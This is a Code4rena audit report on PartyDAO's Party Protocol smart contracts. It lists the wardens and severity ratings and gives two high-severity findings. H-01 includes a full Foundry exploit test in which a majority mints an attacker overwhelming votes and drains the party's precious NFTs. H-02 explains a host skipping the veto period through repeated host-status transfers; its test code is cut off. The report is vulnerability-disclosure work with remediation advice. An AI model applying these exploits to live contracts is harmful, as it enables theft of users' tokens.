---
sponsor: "PartyDAO"
slug: "2023-10-party"
date: "2024-01-10"
title: "Party Protocol"
findings: "https://github.com/code-423n4/2023-10-party-findings/issues"
contest: 301
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Party Protocol smart contract system written in Solidity. The audit took place between October 31 — November 10, 2023.

## Wardens

68 Wardens contributed reports to Party Protocol:

  1. [sin1st3r\_\_](https://code4rena.com/@sin1st3r__)
  2. [TresDelinquentes](https://code4rena.com/@TresDelinquentes) ([Silvermist](https://code4rena.com/@Silvermist), [marchev](https://code4rena.com/@marchev) and [deth](https://code4rena.com/@deth))
  3. [3docSec](https://code4rena.com/@3docSec)
  4. [Arz](https://code4rena.com/@Arz)
  5. [HChang26](https://code4rena.com/@HChang26)
  6. [Vagner](https://code4rena.com/@Vagner)
  7. [Bauchibred](https://code4rena.com/@Bauchibred)
  8. [lsaudit](https://code4rena.com/@lsaudit)
  9. [Pechenite](https://code4rena.com/@Pechenite) ([Bozho](https://code4rena.com/@Bozho) and [radev\_sw](https://code4rena.com/@radev_sw))
  10. [0xbrett8571](https://code4rena.com/@0xbrett8571)
  11. [catellatech](https://code4rena.com/@catellatech)
  12. [0xA5DF](https://code4rena.com/@0xA5DF)
  13. [KupiaSec](https://code4rena.com/@KupiaSec)
  14. [pep7siup](https://code4rena.com/@pep7siup)
  15. [cccz](https://code4rena.com/@cccz)
  16. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  17. [klau5](https://code4rena.com/@klau5)
  18. [pavankv](https://code4rena.com/@pavankv)
  19. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  20. [Madalad](https://code4rena.com/@Madalad)
  21. [Emmanuel](https://code4rena.com/@Emmanuel)
  22. [0xVolcano](https://code4rena.com/@0xVolcano)
  23. [0xAnah](https://code4rena.com/@0xAnah)
  24. [DavidGiladi](https://code4rena.com/@DavidGiladi)
  25. [0xadrii](https://code4rena.com/@0xadrii)
  26. [leegh](https://code4rena.com/@leegh)
  27. [minimalproxy](https://code4rena.com/@minimalproxy)
  28. [adriro](https://code4rena.com/@adriro)
  29. [Shaheen](https://code4rena.com/@Shaheen)
  30. [0xbepresent](https://code4rena.com/@0xbepresent)
  31. [evmboi32](https://code4rena.com/@evmboi32)
  32. [ast3ros](https://code4rena.com/@ast3ros)
  33. [pontifex](https://code4rena.com/@pontifex)
  34. [bart1e](https://code4rena.com/@bart1e)
  35. [P12473](https://code4rena.com/@P12473)
  36. [J4X](https://code4rena.com/@J4X)
  37. [chainsnake](https://code4rena.com/@chainsnake)
  38. [adeolu](https://code4rena.com/@adeolu)
  39. [Neon2835](https://code4rena.com/@Neon2835)
  40. [D1r3Wolf](https://code4rena.com/@D1r3Wolf)
  41. [mahdikarimi](https://code4rena.com/@mahdikarimi)
  42. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  43. [K42](https://code4rena.com/@K42)
  44. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  45. [SAAJ](https://code4rena.com/@SAAJ)
  46. [clara](https://code4rena.com/@clara)
  47. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  48. [Myd](https://code4rena.com/@Myd)
  49. [foxb868](https://code4rena.com/@foxb868)
  50. [Topmark](https://code4rena.com/@Topmark)
  51. [tabriz](https://code4rena.com/@tabriz)
  52. [0xhex](https://code4rena.com/@0xhex)
  53. [0xta](https://code4rena.com/@0xta)
  54. [dharma09](https://code4rena.com/@dharma09)
  55. [arjun16](https://code4rena.com/@arjun16)
  56. [0x11singh99](https://code4rena.com/@0x11singh99)
  57. [tala7985](https://code4rena.com/@tala7985)
  58. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  59. [ybansal2403](https://code4rena.com/@ybansal2403)
  60. [0xMosh](https://code4rena.com/@0xMosh)
  61. [joaovwfreire](https://code4rena.com/@joaovwfreire)
  62. [Walter](https://code4rena.com/@Walter)
  63. [osmanozdemir1](https://code4rena.com/@osmanozdemir1)
  64. [Ch\_301](https://code4rena.com/@Ch_301)
  65. [0xmystery](https://code4rena.com/@0xmystery)

This audit was judged by [gzeon](https://code4rena.com/@gzeon).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 9 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 7 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 22 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 17 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Party Protocol repository](https://github.com/code-423n4/2023-10-party), and is composed of 10 smart contracts written in the Solidity programming language and includes 2120 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **henry**, from warden hihen, generated the [Automated Findings report](https://gist.github.com/code423n4/1ee7d28f8ed9439658a524290a42ce72) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (2)
## [[H-01] The 51% majority can hijack the party's precious tokens through an arbitrary call proposal if the `AddPartyCardsAuthority` contract is added as an authority in the party.](https://github.com/code-423n4/2023-10-party-findings/issues/533)
*Submitted by [sin1st3r\_\_](https://github.com/code-423n4/2023-10-party-findings/issues/533)*

### Pre-requisite knowledge & an overview of the features in question

1. **The [**`AddPartyCardsAuthority`**](https://github.com/code-423n4/2023-10-party/blob/main/contracts/authorities/AddPartyCardsAuthority.sol) contract:** The `AddPartyCardsAuthority` contract is a contract designed to be integrated into a Party and it has only one purpose - to mint new party governance NFT tokens for party members.
    - The party has to add this contract as an authority before it can start minting new party governance NFT tokens for users.
    - The `AddPartyCardsAuthority` contract is deployed on the mainnet on address `0xC534bb3640A66fAF5EAE8699FeCE511e1c331cAD`

2. **The 51% Majority attack:** The PartyDAO team has put a lot of safeguards on a type of proposal called `ArbitraryCallsProposal` to prevent the 51% majority of the party to steal the precious NFT tokens of the party through this type of proposal. For a precious NFT token to be transferred out of the party to any other entity through this proposal, the proposal needs to be unanimously voted (100% of party members have voted on that proposal).

### Overview of the vulnerability

There is no check on the [`ArbitraryCallsProposal`](https://github.com/code-423n4/2023-10-party/blob/main/contracts/proposals/ArbitraryCallsProposal.sol) contract that prevents the calling of the [`AddPartyCardsAuthority`](https://github.com/code-423n4/2023-10-party/blob/main/contracts/authorities/AddPartyCardsAuthority.sol) contract. This allows the 51% majority, through an arbitrary call proposal, to hijack ALL of precious tokens of the party.

They can achieve this by going through the following steps:

1. Create an `ArbitraryCallsProposal` to simply mint a governance NFT token for an arbitrary user with an astronomical voting power, which gives the arbitrary user an ability to pass and bypass the execution delay of any proposal.
2. The newly-created arbitrary user will create an `ArbitraryCallsProposal` with multiple arbitrary calls with a goal of transferring all of the party precious tokens to themselves.
3. The newly-created arbitrary user will then vote on the `ArbitraryCallsProposal` proposal they just created.
4. The proposal will pass and be marked as a unanimously voted proposal, allowing them to bypass all of the safeguards in place to prevent the hijacking of precious NFT tokens through a non-unanimously voted proposal.

### Proof of concept

1. Add the following code to a file with a name of your liking with an extension of ".t.sol".
2. Add the created file to the [`test/`](https://github.com/PartyDAO/party-protocol/tree/main/test) folder
3. Run the following command: `forge test --match-contract TestHijackPreciousTokens --match-test testHijackPreciousExploit -vv`

<details>

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

import { Vm } from "forge-std/Test.sol";
import { TestUtils } from "./TestUtils.sol";
import { IERC721 } from "../contracts/tokens/IERC721.sol";
import { GlobalsAdmin } from "./TestUsers.sol";
import { PartyFactory } from "../contracts/party/PartyFactory.sol";
import { Globals } from "../contracts/globals/Globals.sol";
import { Party } from "../contracts/party/Party.sol";
import { ProposalExecutionEngine } from "../contracts/proposals/ProposalExecutionEngine.sol";
import { IFractionalV1VaultFactory } from "../contracts/proposals/vendor/FractionalV1.sol";
import { MockZoraReserveAuctionCoreEth } from "./proposals/MockZoraReserveAuctionCoreEth.sol";
import { IReserveAuctionCoreEth } from "../contracts/vendor/markets/IReserveAuctionCoreEth.sol";
import { PartyGovernance } from "../contracts/party/PartyGovernance.sol";
import { ERC721Receiver } from "../contracts/tokens/ERC721Receiver.sol";
import { MetadataRegistry } from "../contracts/renderers/MetadataRegistry.sol";
import { TokenDistributor } from "../contracts/distribution/TokenDistributor.sol";
import { OffChainSignatureValidator } from "../contracts/signature-validators/OffChainSignatureValidator.sol";
import {ArbitraryCallsProposal} from "../contracts/proposals/ArbitraryCallsProposal.sol";
import {IProposalExecutionEngine} from "../contracts/proposals/IProposalExecutionEngine.sol";
import {AddPartyCardsAuthority} from "../contracts/authorities/AddPartyCardsAuthority.sol";
import {DummyERC721} from "./DummyERC721.sol";
import "../contracts/utils/LibRawResult.sol";
import "forge-std/console.sol";

/// @notice This contract provides a fully functioning party instance for testing.
///     Run setup from inheriting contract.
abstract contract SetupPartyHelper is TestUtils, ERC721Receiver {

    bool private immutable _isForked;
    GlobalsAdmin internal globalsAdmin;
    Party internal party;
    Party internal partyImpl;
    Globals internal globals;
    PartyFactory internal partyFactory;
    TokenDistributor internal tokenDistributor;
    ProposalExecutionEngine pe;
    AddPartyCardsAuthority addPartyCards;
    uint256 partyTotalVotingPower;

    struct PartyMembersVotingPowers {
        uint96 User_John_Votes;
        uint96 User_Danny_Votes;
        uint96 User_Steve_Votes;
        uint96 User_Adam_Votes;
        uint96 User_Jack_Votes;
        uint96 User_Josh_Votes;
    }

    /** -------------------------- Party Authority -------------------------- */

    // Test authority member with dummy randomly generated address
    address internal authorityTestUser = vm.addr(1);

    /** -------------------------- Party Members -------------------------- */

    // Test members with dummy randomly generated addresses
    address internal user_john = vm.addr(2);
    address internal user_danny = vm.addr(3);
    address internal user_steve = vm.addr(4);

    // Voting power of each party member
    uint96 internal johnVotes;
    uint96 internal dannyVotes;
    uint96 internal steveVotes;

    /** -------------------------- Party Hosts -------------------------- */

    // Test hosts with dummy randomly generated addresses
    address internal host_adam = vm.addr(5);
    address internal host_jack = vm.addr(6);
    address internal host_josh = vm.addr(7);

    // Voting power of each party host
    uint96 internal adamVotes;
    uint96 internal jackVotes;
    uint96 internal joshVotes;

    /** -------------------------- Party precious tokens -------------------------- */

    DummyERC721 internal erc721PreciousToken = new DummyERC721();

    IERC721[] internal preciousTokens = new IERC721[](2);
    uint256[] internal preciousTokenIds = new uint256[](2);


    constructor(bool isForked) {
        _isForked = isForked;
    }

    function CreateNewParty(
        PartyMembersVotingPowers memory votingPowers,
        string memory partyName,
        string memory partySymbol,
        uint40 voteDuration,
        uint40 executionDelay,
        uint16 passThresholdBps,
        bool allowArbCallsToSpendPartyEth,
        bool distributionsRequireVote
    ) public {
        Party.PartyOptions memory opts;

        adamVotes = votingPowers.User_Adam_Votes;
        jackVotes = votingPowers.User_Jack_Votes;
        joshVotes = votingPowers.User_Josh_Votes;

        johnVotes = votingPowers.User_John_Votes;
        dannyVotes = votingPowers.User_Danny_Votes;
        steveVotes = votingPowers.User_Steve_Votes;

        address[] memory hosts = new address[](0);

        opts.name = partyName;
        opts.symbol = partySymbol;
        opts.governance.hosts = hosts;
        opts.governance.voteDuration = voteDuration;
        opts.governance.executionDelay = executionDelay;
        opts.governance.passThresholdBps = passThresholdBps;
        opts.proposalEngine.allowArbCallsToSpendPartyEth = allowArbCallsToSpendPartyEth;
        opts.proposalEngine.distributionsRequireVote = distributionsRequireVote;
        opts.governance.totalVotingPower = johnVotes + dannyVotes + steveVotes + adamVotes + joshVotes + jackVotes;  
        partyTotalVotingPower = opts.governance.totalVotingPower;

        initialize(opts);      
    }

    function initialize(Party.PartyOptions memory opts) internal virtual {
        globalsAdmin = new GlobalsAdmin();
        globals = globalsAdmin.globals();
        partyImpl = new Party(globals);
        address globalDaoWalletAddress = address(420);
        globalsAdmin.setGlobalDaoWallet(globalDaoWalletAddress);

        pe = new ProposalExecutionEngine(
            globals,
            _isForked
                ? IReserveAuctionCoreEth(0x5f7072E1fA7c01dfAc7Cf54289621AFAaD2184d0)
                : new MockZoraReserveAuctionCoreEth(),
            _isForked
                ? IFractionalV1VaultFactory(0x85Aa7f78BdB2DE8F3e0c0010d99AD5853fFcfC63)
                : IFractionalV1VaultFactory(address(0))
        );

        globalsAdmin.setProposalEng(address(pe));

        partyFactory = new PartyFactory(globals);
        globalsAdmin.setGlobalPartyFactory(address(partyFactory));

        tokenDistributor = new TokenDistributor(globals, 0);
        globalsAdmin.setTokenDistributor(address(tokenDistributor));

        address[] memory registrars = new address[](2);
        registrars[0] = address(this);
        registrars[1] = address(partyFactory);
        MetadataRegistry metadataRegistry = new MetadataRegistry(globals, registrars);
        globalsAdmin.setMetadataRegistry(address(metadataRegistry));

        OffChainSignatureValidator offChainGlobalValidator = new OffChainSignatureValidator();
        globalsAdmin.setOffChainSignatureValidator(address(offChainGlobalValidator));

        addPartyCards = new AddPartyCardsAuthority();

        address[] memory authorities = new address[](1);
        authorities[0] = authorityTestUser;

        // Mint two precious tokens
        uint256 firstPreciousTokenId = erc721PreciousToken.mint(address(this)); // NFT ID 1
        uint256 secondPreciousTokenId = erc721PreciousToken.mint(address(this)); // NFT ID 2

        preciousTokens[0] = IERC721(address(erc721PreciousToken));
        preciousTokens[1] = IERC721(address(erc721PreciousToken));
        preciousTokenIds[0] = firstPreciousTokenId;
        preciousTokenIds[1] = secondPreciousTokenId;

        party = partyFactory.createParty(
            partyImpl,
            authorities,
            opts,
            preciousTokens,
            preciousTokenIds,
            0
        );

        // Approve the created party to spend the two precious tokens.
        erc721PreciousToken.transferFrom(address(this), address(party), firstPreciousTokenId);
        erc721PreciousToken.transferFrom(address(this), address(party), secondPreciousTokenId);

        vm.startPrank(authorityTestUser);

        // Give party members voting powers
        party.mint(user_john, johnVotes, user_john);
        party.mint(user_danny, dannyVotes, user_danny);
        party.mint(user_steve, steveVotes, user_steve);

        // Give party members voting powers
        party.mint(host_adam, adamVotes, host_adam);
        party.mint(host_jack, jackVotes, host_jack);
        party.mint(host_josh, joshVotes, host_josh);

        vm.stopPrank();

        vm.warp(block.timestamp + 1);
    }

}

contract TestHijackPreciousTokens is SetupPartyHelper {

    constructor() SetupPartyHelper(false) {}

    /** ------ Create a new party ------ */
    function setUp() public { 

        PartyMembersVotingPowers memory votingPowers = PartyMembersVotingPowers({
            User_John_Votes: 50 ether,
            User_Danny_Votes: 50 ether,
            User_Steve_Votes: 50 ether,
            User_Adam_Votes: 50 ether,
            User_Jack_Votes: 50 ether,
            User_Josh_Votes: 50 ether
        });

        super.CreateNewParty(
            votingPowers,
            "TestParty",
            "PRT",
            100,
            0, // setting the execution delay as zero for the poc
            5000, // 50% of members have to accept the proposal for it go through
            true,
            true
        );

        // Add `AddPartyCardsAuthority` contract as an authority
        vm.prank(address(party));
        party.addAuthority(address(addPartyCards));

    }

    function testHijackPreciousExploit() public {

        /** ----------------------- [STAGE 1] ----------------------- */
        /**
        * [Stage 1] of the exploit objectives:
        *  -  Through an arbitrary call (unanimous proposal),
        *      mint an arbitrary address `attacker` an astronomical voting power.
        */

        address attacker = vm.addr(48748743784378);

        ArbitraryCallsProposal.ArbitraryCall[] memory calls = new ArbitraryCallsProposal.ArbitraryCall[](1);

        address[] memory newPartyMembers = new address[](1);
        uint96[] memory newPartyMemberVotingPowers = new uint96[](1);
        address[] memory initialDelegates = new address[](1);

        newPartyMembers[0] = attacker;
        newPartyMemberVotingPowers[0] = 7922816251426433759354395;
        initialDelegates[0] = address(0);

        /** ------------ Non-unanimous `ArbitraryCall` proposal ------------ */

        calls[0] = createArbitraryCall(
            address(addPartyCards),
            abi.encodeWithSelector(AddPartyCardsAuthority.addPartyCards.selector, newPartyMembers, newPartyMemberVotingPowers, initialDelegates)
        );

        PartyGovernance.Proposal memory test_proposal = createArbitraryCallProposal(calls);

        vm.prank(user_john);
        uint256 proposalId = party.propose(test_proposal, 0);

        vm.prank(user_danny);
        party.accept(proposalId, 0);

        vm.prank(user_steve);
        party.accept(proposalId, 0);

        vm.prank(user_john);
        party.execute(
            proposalId,
            test_proposal,
            preciousTokens,
            preciousTokenIds,
            "",
            ""
        );

        vm.warp(block.timestamp + 5);

        /** ----------------------- [STAGE 2] ----------------------- */
        /**
        * [Stage 2] of the exploit objectives:
        *  -  Hijack the two precious tokens of the party
        * 
        *  The attacker will simply create an `ArbitraryCall` proposal to transfer the two precious tokens to him
        *  Since the attacker was minted voting power equivalent to the total voting power, 
        *      the proposal will be marked as unanimous, bypassing the execution delay and precious NFT safeguards.
        */

        calls = new ArbitraryCallsProposal.ArbitraryCall[](2);

        calls[0] = createArbitraryCall(
            address(preciousTokens[0]),
            abi.encodeWithSelector(IERC721.transferFrom.selector, address(party), address(attacker), preciousTokenIds[0])
        );

        calls[1] = createArbitraryCall(
            address(preciousTokens[1]),
            abi.encodeWithSelector(IERC721.transferFrom.selector, address(party), address(attacker), preciousTokenIds[1])
        );

        test_proposal = createArbitraryCallProposal(calls);

        // The proposal will pass, will be marked as unanimous and it'll be ready to execute.

        vm.startPrank(attacker);

        proposalId = party.propose(test_proposal, 1);

        party.execute(
            proposalId,
            test_proposal,
            preciousTokens,
            preciousTokenIds,
            "",
            ""
        );

        vm.stopPrank();

    }



    struct ArbitraryCall {
        address payable target;
        uint256 value;
        bytes data;
        bytes32 expectedResultHash;
    }

    function createArbitraryCallProposal(ArbitraryCallsProposal.ArbitraryCall[] memory calls) public pure returns(PartyGovernance.Proposal memory) {
        return PartyGovernance.Proposal({
            maxExecutableTime: uint40(999999999999),
            cancelDelay: 10000,
            proposalData: abi.encodeWithSelector(
                bytes4(uint32(ProposalExecutionEngine.ProposalType.ArbitraryCalls)),
                calls
            )
        });
    }


    function createArbitraryCall(
        address arbitraryCallTarget,
        bytes memory targetData
    )
        private
        pure
        returns (ArbitraryCallsProposal.ArbitraryCall memory)
    {
        return ArbitraryCallsProposal.ArbitraryCall({
                target: payable(address(arbitraryCallTarget)),
                value: 0,
                data: targetData,
                expectedResultHash: bytes32(0)
            });
    }


}
```

</details>

### Remediation

In the function [`_isCallAllowed`](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/proposals/ArbitraryCallsProposal.sol#L159) in [`ArbitraryCallsProposal`](https://github.com/code-423n4/2023-10-party/blob/main/contracts/proposals/ArbitraryCallsProposal.sol), add a check to prevent an arbitrary call from calling the contract `AddPartyCardsAuthority`. Or add a check to prevent an arbitrary call with a function selector, equivalent to that of the [`addPartyCards`](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/authorities/AddPartyCardsAuthority.sol#L29) function in the `ArbitraryPartyCardsAuthority` contract, to be executed.

### Assessed type

Token-Transfer

**[KingNFT (lookout) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1806760560):**
 > A malicious `AddPartyCardsAuthority` proposal could be rejected by hosts during the `ExecutionDelay` phase - the likelihood of a success attack is not too high.
> 
> M might be more appropriate.

**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1811256897):**
 > Valid, although likely will not fix, as we've been debating removing the precious mechanism in a subsequent release. In additional to what @KingNFT pointed out, members can also use rage quit to exit if enabled.

**[arr00 (Party) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1813089870):**
 > An additional detail to add is that parties utilizing precious tokens would set their `enableAddAuthority` flag to `false` which would disable adding authorities. See [here](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/proposals/ProposalExecutionEngine.sol#L272-L274).

**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1817860707):**
 > While governance attacks are typically out-of-scope, this attack specifically bypasses the precious mechanism, which I believe will make it reasonable to consider this as a valid medium.

**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1822182849):**
> I would like to  mention that I believe it's unfair to treat this report as a medium when the PartyDAO team considers this vulnerability to be high/severe.[ In their bug bounty program table](https://github.com/PartyDAO/party-protocol#bug-bounty) they specifically mention "bypass guardrails to transfer precious NFT from parties" to be a severe level vulnerability
> 
> Additionally, looking at one of the audit reports they received from a firm (https://github.com/PartyDAO/party-protocol/blob/main/audits/Party-Protocol-Macro-Audit.pdf), one of the high severity findings listed is similar to the bug in question, just a different way to bypass the precious NFT token guardrails (and it was acknowledged and fixed).
> 
> It's worth mentioning that they consider it a high severity vulnerability only if the majority is able to hijack the precious NFT tokens through `ArbitraryCallsProposal` only and not any other type of proposal. This report clearly demonstrates the ability for an attacker to hijack the precious tokens through `ArbitraryCallsProposal`.

**[deth (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1822478383):**
> I would like to point out that a majority attack has been acknowledged in a previous [c4 finding](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736).
> 
> Issue #124 was judged as invalid because it was reported in a previous [c4 finding as well](https://github.com/code-423n4/2023-05-party-findings/issues/19).

**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1823247602):**
> @deth - The previous C4 finding is about how an attacker can (under some circumstances/conditions) execute a flash loan attack to get 51% voting power and (potentially) create proposals and get them to pass if no host has vetoed on them.
>
> The finding in question here, is discussing how the 51% majority is able to hijack precious NFT tokens through an arbitrary call proposal when the intended behavior is to be able to transfer the precious NFT tokens out of a party through an arbitrary call proposal ONLY IF the proposal was voted on by 100% of the party members and not just the majority. The PartyDAO team has put several safeguards to prevent the transfer of those precious tokens through an arbitrary call proposal if it has not been unanimously voted (unanimous vote `== 100%` of the party members voted on the proposal).
>
> The finding in question bypasses all those mitigations. I made the case why this is a high severity vulnerability not a medium one, in my previous comment.

**[deth (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1823319878):**
> @0xStalin - I agree that this report is nuanced, but isn't Stage 1 of the issue a majority attack?
> 
> > The 51% majority can hijack precious tokens of a party through an arbitrary call proposal.
> 
> > The finding in question is discussing how the 51% majority is able to hijack precious NFT
> 
> You also state it passes all mitigations and safeguards, but the `executionDelay` of the Party is set to `0` in the PoC. The `executionDelay` in itself is a safeguard.
> 
> Quote from the [previous finding](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736).
> > The expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don't (e.g. set an execution delay of `0`) it is a deliberate choice on their part rather than a vulnerability.
> 
> Will this attack still work, if `executionDelay != 0`, because it's the hosts responsibility to veto these sorts of proposals and it's their error if `executionDelay ` is set to `0` in the first place? 

**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1823835157):**
> @deth - So there are multiple things I need to point out in regards to the context of the bug in question.
> 
> When I point out that it bypasses all mitigations and safeguards, I'm talking about the safeguards implemented in the `ArbitraryCallsProposal` specifically, the `executionDelay` is out of question and I'll explain why in my next point. You can see the precious NFT safeguards implemented in `ArbitraryCallsProposal` lines 185-215 and lines 63-104.
> 
> This begs the question: okay why `ArbitraryCallsProposal` specifically is an issue? The majority can actually execute this attack by adding a new authority through `AddAuthorityProposal` and hijack those tokens or they can hijack those through other proposals.
>
> The thing with `ArbitraryCallsProposal`, specifically, is that it can execute any arbitrary logic and does NOT have defined actions and defined risk (I'm quoting the sponsor here). A single party member/attacker can very easily trick the majority into accepting this proposal and hijack those tokens, so it doesn't even have to be the 51% majority trying to steal them.
>
> This was the sponsor's response when asked why do they consider hijacking precious tokens through a unanimously voted `ArbitraryCallProposal` a vulnerability while the same can be achieved using other proposals:
>> "It is more dangerous because it can execute any arbitrary logic whereas other proposals have defined actions and defined risk."
>
> and that's really why the `executionDelay` protection is not so relevant here.

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824391496):**
 > This is not a duplicate of [this previous c4 finding](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736). `executionDelay` is not relevant here, as it is relevant in the other issue where it prevents the same block execution with a flashloan. That issue also does NOT bypass precious mechanism.
> 
> However, both contracts in question here ()`AddPartyCardsAuthority` and `ArbitraryCallsProposal`) are actually [out-of-scope](https://github.com/code-423n4/2023-10-party/blob/main/scope.txt) for this audit. So despite this, it seems to be a valid bypass with sponsor acknowledgment, this would be considered as out-of-scope and you should report it to [PartyDAO bug bounty program](https://github.com/PartyDAO/party-protocol#bug-bounty) instead.

**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824646266):**
> @gzeon - The `ProposalExecutionEngine` contract implements the `ArbitraryCallsProposal` contract so the `ArbitraryCallsProposal` contract is in-scope as well as all the other contracts which the `ProposalExecutionEngine` contract extends, isn't it?
> 
> The `ArbitraryCallsProposal` is an abstract contract and is implemented by the `ProposalExecutionEngine` which would make it an in-scope asset, isn't it?
> 
> Secondly, while the `AddPartyCardsAuthority` is OOS, the issue does NOT exist in this contract in the first place. The issue exists in `ArbitraryCallsProposal` contract. It's just that when `AddPartyCardsAuthority` is added to a party to extend the functionality, this becomes an issue and precious tokens can easily be hijacked.

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824663461):**
 > Reviewing again, thanks for the correction.

**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824683119):**
 > Agree to pump this to High after considering [PartyDAO bug bounty program](https://github.com/PartyDAO/party-protocol#bug-bounty) and the fact that guardrail can be bypassed to steal tokens.

***

## [[H-02] Single host can unfairly skip veto period for proposal that does not have full host support](https://github.com/code-423n4/2023-10-party-findings/issues/233)
*Submitted by [Madalad](https://github.com/code-423n4/2023-10-party-findings/issues/233), also found by [sin1st3r\_\_](https://github.com/code-423n4/2023-10-party-findings/issues/538), [adriro](https://github.com/code-423n4/2023-10-party-findings/issues/507), [Emmanuel](https://github.com/code-423n4/2023-10-party-findings/issues/488), [0xbepresent](https://github.com/code-423n4/2023-10-party-findings/issues/444), [evmboi32](https://github.com/code-423n4/2023-10-party-findings/issues/396), [Shaheen](https://github.com/code-423n4/2023-10-party-findings/issues/370), [3docSec](https://github.com/code-423n4/2023-10-party-findings/issues/331), klau5 ([1](https://github.com/code-423n4/2023-10-party-findings/issues/323), [2](https://github.com/code-423n4/2023-10-party-findings/issues/322)), [ast3ros](https://github.com/code-423n4/2023-10-party-findings/issues/315), [pontifex](https://github.com/code-423n4/2023-10-party-findings/issues/288), [HChang26](https://github.com/code-423n4/2023-10-party-findings/issues/258), [bart1e](https://github.com/code-423n4/2023-10-party-findings/issues/241), [P12473](https://github.com/code-423n4/2023-10-party-findings/issues/156), and [rvierdiiev](https://github.com/code-423n4/2023-10-party-findings/issues/75)*

After a proposal passes the vote threshold, there is a delay before it can be executed so that hosts get a chance to `veto` it if they wish. If all hosts voting in favour of the proposal, then this veto period is skipped.

However, a single host can ensure the veto period is skipped even if no other hosts `accept` the proposal. The veto period is in place to prevent harmful/exploitative proposals from being executed, even if they are passed; therefore, a malicious/compromised host being able to skip the veto period can be seriously harmful to the protocol and its users. The [Tornado Cash governance hack](https://medium.com/coinmonks/tornado-cash-governance-hack-ec77ebb3aa68) from May 2023 is a relevant example, during which the attacker was able to steal around `$`1 million worth of assets.

This attack has a very low cost and a very high potential impact. If a malicious proposal is crafted in the same way used by the Tornado Cash attacker using hidden `CREATE2` and `SELFDESTRUCT` operations, then it is entirely feasible that it would meet the voting threshold, as many voters may not be savvy enough to spot the red flags.

### Proof of Concept

`PartyGovernance#abdicateHost` is a function that allows a host to renounce their host privileges, and transfer them to another address.

```solidity
File: contracts\party\PartyGovernance.sol

457:     /// @notice Transfer party host status to another.
458:     /// @param newPartyHost The address of the new host.
459:     function abdicateHost(address newPartyHost) external {
460:         _assertHost();
461:         // 0 is a special case burn address.
462:         if (newPartyHost != address(0)) {
463:             // Cannot transfer host status to an existing host.
464:             if (isHost[newPartyHost]) {
465:                 revert InvalidNewHostError();
466:             }
467:             isHost[newPartyHost] = true;
468:         } else {
469:             // Burned the host status
470:             --numHosts;
471:         }
472:         isHost[msg.sender] = false;
473:         emit HostStatusTransferred(msg.sender, newPartyHost);
474:     }
```

<https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L457>

This can be done at any stage in the life cycle of a proposal. This means that a host can `accept` a proposal, incrementing the `numHostsAccepted` value for that proposal, then transfer the host status to another wallet that they control (that has non-zero voting power) and `accept` again, incrementing `numHostsAccepted` for a second time. This process can be repeated as many times as necessary until `numHostsAccepted` is equal to the total number of hosts `numHosts`. Once the proposal reaches the required vote threshold, the veto period will be skipped, despite only one host accepting.

The following foundry test shows the process described above. Copy and paste it into PartyGovernanceTest.t.sol to run.

```solidity
    function test_maliciousHost() public {
        // Create users
        PartyParticipant alice = new PartyParticipant();
        PartyParticipant bob = new PartyParticipant();
        PartyParticipant chad = new PartyParticipant();
        PartyParticipant aliceAltWallet = new PartyParticipant();

        // Create party
        uint16 passThresholdBps = 5100;
        (
            Party party,
            IERC721[] memory preciousTokens,
